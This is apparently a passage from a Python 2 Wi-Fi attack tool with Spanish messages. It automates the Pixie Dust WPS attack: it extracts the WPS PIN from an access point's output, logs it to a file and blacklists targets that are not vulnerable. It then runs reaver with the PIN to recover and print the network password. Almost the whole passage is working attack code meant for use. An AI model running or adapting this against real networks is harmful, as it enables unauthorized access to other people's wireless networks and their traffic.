	output = engine.run(command, timeout = 2)
	output = [i.strip() for i in output]
	for linea in output:
	  if '[+] WPS pin:' in linea:
	    result = compile('\d+')
	    pin = result.search(linea).group(0)
	    break
      except:             #Tengo que manejar un posible error del Pixie
	pass
      if pin != '': break
    if pin != '' and len(pin) == 8:
      print INFO + "Pin WPS encontrado!"
      print "\t" + INPUT + pin
      for_file.append('Pin WPS: '+pin+'\n')
      system('echo >> pyxiewpsdata.txt')
      with open('pyxiewpsdata.txt','a+') as f:
	f.write(ESSID+'\n')
	f.write(pin)
    elif pin == '':
      print
      print ALERTA + "No se encontro el pin WPS."
      print "    Es posible que el AP no sea vulnerable al"
      print "    ataque PixieDust y nunca lo sea"
      print
      blacklist.append(BSSID)
    if GET_PASSWORD and pin != '':
      self.get_password(for_file, BSSID, pin, canal)
    elif OUTPUT:
      for_file.append('-'*40+'\n')
      c.data_file(for_file)
  
  def get_password(self, for_file, BSSID, pin, canal):
    """
    Intenta averiguar la contrasenia, una vez que se consiguio el pin WPS
    """
    
    output = engine.run(cmd=['reaver','-i',c.IFACE_MON,'-b',BSSID,'-c',canal,'-p',pin,'-L'], timeout = (REAVER_TIME))
    password = engine.parse_reaver(output, pin_encontrado = True)
    if password == 'no password':
      print
      print ALERTA + "No se pudo recuperar la contrasenia en este momento"
      print "    pero puede acceder a la red WiFi a traves del pin WPS"
      print
    else:
      print INFO + "Clave encontrada!"
      print '\t' + INPUT + password.strip()
      print
    if OUTPUT:
      for_file.append('Password: ' + password + '\n'+'-'*40+'\n')
      c.data_file(for_file)

if __name__ == '__main__':
  banner()
  arg_parser()
  try:
    c = Config()
    engine = Engine()
    engine.check()
  except KeyboardInterrupt, EOFError:
    print
    print ALERTA + "Programa interrumpido!"
    print    
    engine.exit_limpio()
